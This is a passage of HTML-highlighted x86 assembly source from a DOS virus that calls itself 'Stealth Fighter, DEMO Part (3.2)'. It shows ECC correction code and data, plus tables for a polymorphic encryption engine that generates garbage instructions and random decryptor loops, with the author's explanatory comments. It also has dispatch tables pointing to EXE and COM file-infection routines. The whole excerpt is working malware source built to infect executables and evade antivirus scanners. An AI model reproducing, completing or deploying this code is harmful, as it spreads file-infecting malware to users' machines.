        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">        </span><span class="sc1">; and correct</span><span class="sc0">

</span><span class="sc5">ecc_correct_bytechain_ok</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">ecc_correct_nextseg</span><span class="sc0">

        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; next bit checking</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">ecc_correct_nextbit</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">    </span><span class="sc2">8</span><span class="sc0">

</span><span class="sc1">; just to pad the ecc stuff to a 10h alignment</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">ecc_check_data</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">0C5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">54h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6Fh</span><span class="sc4">,</span><span class="sc2">0A8h</span><span class="sc4">,</span><span class="sc2">0CDh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">5h</span><span class="sc4">,</span><span class="sc2">0B1h</span><span class="sc4">,</span><span class="sc2">0B9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">62h</span><span class="sc4">,</span><span class="sc2">0B2h</span><span class="sc4">,</span><span class="sc2">0B9h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0BEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc2">0F2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Ch</span><span class="sc4">,</span><span class="sc2">0B6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">29h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">5Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">39h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">95h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">17h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">46h</span><span class="sc4">,</span><span class="sc2">0B7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">23h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16h</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">26h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">,</span><span class="sc2">0DCh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">3Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">77h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">19h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">88h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9Bh</span><span class="sc4">,</span><span class="sc2">0E3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc2">0F6h</span><span class="sc4">,</span><span class="sc2">0B9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">69h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D3h</span><span class="sc4">,</span><span class="sc2">0FDh</span><span class="sc4">,</span><span class="sc2">0BCh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Dh</span><span class="sc4">,</span><span class="sc2">0CFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">62h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc2">0A4h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">22h</span><span class="sc4">,</span><span class="sc2">0FBh</span><span class="sc4">,</span><span class="sc2">0E2h</span><span class="sc4">,</span><span class="sc2">0A3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">27h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">91h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">23h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">45h</span><span class="sc4">,</span><span class="sc2">0D4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ch</span><span class="sc4">,</span><span class="sc2">0B7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Bh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D7h</span><span class="sc4">,</span><span class="sc2">0A1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">54h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">95h</span><span class="sc4">,</span><span class="sc2">0B4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Dh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">93h</span><span class="sc4">,</span><span class="sc2">0B0h</span><span class="sc4">,</span><span class="sc2">0CCh</span><span class="sc4">,</span><span class="sc2">0D6h</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">99h</span><span class="sc4">,</span><span class="sc2">0AAh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">37h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">36h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">99h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">19h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">59h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">9Eh</span><span class="sc4">,</span><span class="sc2">0E4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Dh</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">93h</span><span class="sc4">,</span><span class="sc2">0F4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">62h</span><span class="sc4">,</span><span class="sc2">0E0h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">3Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Ah</span><span class="sc4">,</span><span class="sc2">0B6h</span><span class="sc4">,</span><span class="sc2">0BDh</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Fh</span><span class="sc4">,</span><span class="sc2">0EFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Fh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0CCh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">,</span><span class="sc2">0D6h</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">36h</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">94h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">55h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8h</span><span class="sc4">,</span><span class="sc2">0B2h</span><span class="sc4">,</span><span class="sc2">0DAh</span><span class="sc4">,</span><span class="sc2">0A9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9Fh</span><span class="sc4">,</span><span class="sc2">0FDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">86h</span><span class="sc0">
</span><span class="sc1">; ecc data finished, 90h bytes</span><span class="sc0">

</span><span class="sc5">string</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'"Stealth Fighter,DEMO Part (3.2) : Next mutation 06/09/95"'</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'$'</span><span class="sc0">


</span><span class="sc5">routines_table</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">routines_various_memoff_or_rr</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">routines_copy_one_plus_imm</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">routines_math_with_immediate</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">routines_manage_math_twobytes</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">routines_one_byte_16reg</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">routines_copy_one_byte</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">routines_copy_one_word</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">routines_copy_many_bytes</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">routines_manage_jumps</span><span class="sc0">

        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jump_grb_returnroutine</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jump_grb_returnroutine</span><span class="sc0">

</span><span class="sc1">; table with routines that generate a math operation on the memory using the</span><span class="sc0">
</span><span class="sc1">; pointer register, ie. xor [pnt],reg and such.</span><span class="sc0">
</span><span class="sc5">mom_table</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mom_routines_xor_mem</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mom_routines_add_mem</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mom_routines_sub_mem</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mom_routines_ror_1_mem</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mom_routines_rol_1_mem</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mom_routines_ror_cl_mem</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mom_routines_rol_cl_mem</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mom_routines_neg_mem</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mom_routines_not_mem</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mom_routines_inc_mem</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mom_routines_dec_mem</span><span class="sc0">

</span><span class="sc1">; same as before, but has the complementary instruction for at the same</span><span class="sc0">
</span><span class="sc1">; position of the previous one (ie. add in mom_table and sub in here)</span><span class="sc0">
</span><span class="sc5">mom_table_inv</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mom_routines_xor_mem</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mom_routines_sub_mem</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mom_routines_add_mem</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mom_routines_rol_1_mem</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mom_routines_ror_1_mem</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mom_routines_rol_cl_mem</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mom_routines_ror_cl_mem</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mom_routines_neg_mem</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mom_routines_not_mem</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mom_routines_dec_mem</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mom_routines_inc_mem</span><span class="sc0">

</span><span class="sc5">prepare_file</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">prepare_exe</span><span class="sc0">     </span><span class="sc1">; Offset of prepare_exe</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">prepare_com</span><span class="sc0">     </span><span class="sc1">; Offset of prepare_com</span><span class="sc0">
</span><span class="sc5">infect_file_</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">infect_exe</span><span class="sc0">      </span><span class="sc1">; Offset of infect_exe</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">infect_com</span><span class="sc0">      </span><span class="sc1">; Offset of infect_com</span><span class="sc0">

</span><span class="sc1">; table with complementary service routines used in the poly. they generate</span><span class="sc0">
</span><span class="sc1">; simple tasks with the given reg. the names should describe well the job.</span><span class="sc0">
</span><span class="sc5">service_routines_table</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">s_routines_zero_reg_with_sub_reg_reg</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">s_routines_zero_reg_with_xor_reg_reg</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">s_routines_and_reg_with_zero</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">s_routines_mov_imm_in_reg</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">s_routines_mov_imm_in_reg</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">s_routines_or_reg_with_ffff</span><span class="sc0">

</span><span class="sc1">; table with routines for possible initialization steps, like counter and</span><span class="sc0">
</span><span class="sc1">; pointer initializations</span><span class="sc0">
</span><span class="sc5">table_init_type</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">i_routines_cnt_to_zero_and_pnt</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">i_routines_cnt_pnt_with_imm</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">i_routines_just_pointer</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">i_routines_cnt_to_zero_and_pnt</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">i_routines_cnt_to_zero_and_pnt</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">i_routines_cnt_pnt_with_imm</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">i_routines_just_pointer</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">i_routines_cnt_to_zero_and_pnt</span><span class="sc0">

</span><span class="sc1">; table with routine for possible kinds of check if the decryption loop is</span><span class="sc0">
</span><span class="sc1">; finished. they are strictly connected to the way the pointer and counter were</span><span class="sc0">
</span><span class="sc1">; initialized at the beginning. so the routine for the check for the end of</span><span class="sc0">
</span><span class="sc1">; loop in this routine at Xth position is the one that complies with the</span><span class="sc0">
</span><span class="sc1">; initialization of the registers generated from the previous table with the</span><span class="sc0">
</span><span class="sc1">; entry at the Xth position.</span><span class="sc0">
</span><span class="sc5">table_end_loop_check</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">endloop_check_counter_upwards</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">endloop_check_counter_down_wl</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">endloop_check_just_pointer</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">endloop_check_counter_upwards</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">endloop_check_counter_upwards</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">endloop_check_counter_down</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">endloop_check_just_pointer</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">endloop_check_counter_upwards</span><span class="sc0">

</span><span class="sc1">; table of possible regs used as pointers</span><span class="sc0">
</span><span class="sc5">possible_pointers</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">6</span><span class="sc0">     </span><span class="sc1">; si</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">7</span><span class="sc0">     </span><span class="sc1">; di</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">5</span><span class="sc0">     </span><span class="sc1">; bp</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0">     </span><span class="sc1">; bx</span><span class="sc0">

</span><span class="sc5">ds_</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">      </span><span class="sc1">; Data segment (DS)</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">ds__</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Data segment (DS)</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">08h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">need_segovv</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">int08_count</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Interrupt 08h counter</span><span class="sc0">
</span><span class="sc5">int08_stat</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Status of interrupt 08h</span><span class="sc0">
</span><span class="sc5">rda_steps_table</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; the next table is used to copy the rda body (from rda_basic_body) and include</span><span class="sc0">
</span><span class="sc1">; some garbage between the real rda instructions. each entry of the table will</span><span class="sc0">
</span><span class="sc1">; be interpreted as an instruction meaning how many bytes have to be copied and</span><span class="sc0">
</span><span class="sc1">; which registers can be used for garbage generation (so the garbage won't</span><span class="sc0">
</span><span class="sc1">; mess the needed registers and flags values).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; i won't comment all the steps one by one (which would be pretty boring :) )</span><span class="sc0">
</span><span class="sc1">; but will give the general scheme of the interpretation of the entries and</span><span class="sc0">
</span><span class="sc1">; a few examples. of course you should check the rda_basic_body part often for</span><span class="sc0">
</span><span class="sc1">; a correct interpretation.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; command byte combinations meanings, (checked in this order!):</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; xxx0xxxx   = just copy, lenght from [bx+1], keep old reg compatibility</span><span class="sc0">
</span><span class="sc1">; xxxxxx1x   = garbage just with compatibility type 09</span><span class="sc0">
</span><span class="sc1">; xxxxx1xx   = garbage just with compatibility type 0e</span><span class="sc0">
</span><span class="sc1">; xxxxxxxx   = just copy, lenght from [bx+2], reg compatibilty in [bx+1]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EFh</span><span class="sc0"> </span><span class="sc1">; can use all regs as garbage</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">; copy three bytes (the delta offset call)</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">; copy two bytes</span><span class="sc0">

        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">12</span><span class="sc0">  </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">02efh</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; as before</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc1">; copy 10h bytes. this bytes are the ones that are</span><span class="sc0">
            </span><span class="sc1">; placed in rda_to_part_1 that has been choosed before</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc1">; copy 20h bytes. this bytes are the ones that are</span><span class="sc0">
            </span><span class="sc1">; placed in rda_to_part_2 that has been choosed before</span><span class="sc0">
            </span><span class="sc1">; the first part</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EFh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc1">; copy 20h bytes. this bytes are the second part</span><span class="sc0">
            </span><span class="sc1">; of the ones placed in the rda_to_part_2</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A9h</span><span class="sc0"> </span><span class="sc1">; garbage without bx,dx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">; copy two bytes</span><span class="sc0">

